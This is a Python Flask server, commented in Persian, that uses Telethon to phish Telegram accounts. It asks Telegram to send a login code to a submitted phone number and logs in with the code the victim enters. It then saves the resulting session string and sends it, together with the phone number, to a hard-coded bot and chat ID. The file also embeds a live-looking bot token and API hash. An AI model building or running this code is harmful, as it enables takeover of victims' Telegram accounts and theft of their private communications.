from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient
import asyncio
import os
import logging

# ============================================================
#  تنظیمات
# ============================================================
app = Flask(__name__)
CORS(app)

API_ID = 2899
API_HASH = '36722c72256a24c1225de00eb6a1ca74'
BOT_TOKEN = '8591425870:AAEAjapPJnv_Q_NfW5NbTX6_b-zrGMPGv-s'
CHAT_ID = '8491102319'

sessions = {}

# ============================================================
#  لاگینگ
# ============================================================
logging.basicConfig(level=logging.INFO)

# ============================================================
#  حلقه رویداد ثابت
# ============================================================
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ============================================================
#  روت‌ها
# ============================================================
@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok', 'sessions': len(sessions)})

@app.route('/request-code', methods=['POST'])
def request_code():
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({'error': 'Phone required'}), 400
    
    session_id = f"session_{phone.replace('+', '')}"
    sessions[session_id] = {'phone': phone, 'status': 'pending', 'client': None}
    
    try:
        loop.run_until_complete(send_code(session_id, phone))
    except Exception as e:
        logging.error(f"Error in request_code: {e}")
        return jsonify({'error': str(e)}), 500
    
    return jsonify({'success': True, 'request_id': session_id})

@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    session_id = data.get('request_id')
    code = data.get('code')
    phone = data.get('phone')
    
    if not session_id or not code:
        return jsonify({'error': 'Missing data'}), 400
    
    session = sessions.get(session_id)
    if not session:
        return jsonify({'error': 'Session not found'}), 400
    
    try:
        result = loop.run_until_complete(verify_session(session_id, phone, code))
        if result:
            return jsonify({'success': True, 'message': 'Code verified'})
        else:
            return jsonify({'error': 'wrong_code'}), 400
    except Exception as e:
        logging.error(f"Error in verify_code: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================
#  توابع اصلی (async)
# ============================================================
async def send_code(session_id, phone):
    try:
        client = TelegramClient(session_id, API_ID, API_HASH)
        await client.connect()
        
        # ارسال درخواست کد
        result = await client.send_code_request(phone)
        
        # ذخیره phone_code_hash برای مرحله بعد
        sessions[session_id]['client'] = client
        sessions[session_id]['phone_code_hash'] = result.phone_code_hash
        sessions[session_id]['status'] = 'code_sent'
        
        logging.info(f"✅ Code sent to: {phone}")
        
    except Exception as e:
        sessions[session_id]['status'] = 'error'
        logging.error(f"❌ Error sending code: {e}")
        raise

async def verify_session(session_id, phone, code):
    session = sessions.get(session_id)
    if not session:
        return False
    
    client = session.get('client')
    if not client:
        logging.error(f"❌ No client for {phone}")
        return False
    
    try:
        # ✅ روش درست: استفاده از phone_code_hash
        phone_code_hash = session.get('phone_code_hash')
        
        if phone_code_hash:
            # لاگین با کد و هش
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        else:
            # روش جایگزین: لاگین فقط با کد
            await client.sign_in(code=code)
        
        # دریافت سشن
        session_string = client.session.save()
        
        # ارسال به ربات
        await send_to_bot(f"User : {phone}\nکد سیشن : {session_string}")
        
        sessions[session_id]['status'] = 'done'
        await client.disconnect()
        logging.info(f"✅ Session saved for: {phone}")
        return True
        
    except Exception as e:
        sessions[session_id]['status'] = 'error'
        logging.error(f"❌ Verification error: {e}")
        
        # اگر کد اشتباه بود
        error_msg = str(e).lower()
        if 'code' in error_msg or 'invalid' in error_msg or 'phone' in error_msg:
            return False
        raise

async def send_to_bot(message):
    try:
        client = TelegramClient('bot_session', API_ID, API_HASH)
        await client.start(bot_token=BOT_TOKEN)
        await client.send_message(CHAT_ID, message)
        await client.disconnect()
    except Exception as e:
        logging.error(f"❌ Bot error: {e}")
        raise

# ============================================================
#  اجرا
# ============================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
